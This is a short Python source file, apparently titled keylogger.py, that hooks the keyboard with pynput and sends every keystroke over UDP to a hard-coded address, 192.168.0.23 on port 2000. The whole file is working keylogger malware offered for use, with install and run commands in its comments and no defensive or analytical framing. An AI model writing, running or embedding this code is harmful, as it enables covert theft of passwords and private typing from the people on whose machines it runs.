#pip3 install pynput
#python3 keylogger.py
from pynput.keyboard import Key, Listener
import socket
import sys

host = "192.168.0.23"
port = 2000

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = (host, port)

def on_press(key):
    print(key) 
    sock.sendto(str(key).encode('utf-8'), server_address)

with Listener(on_press=on_press) as listener:
    listener.join()
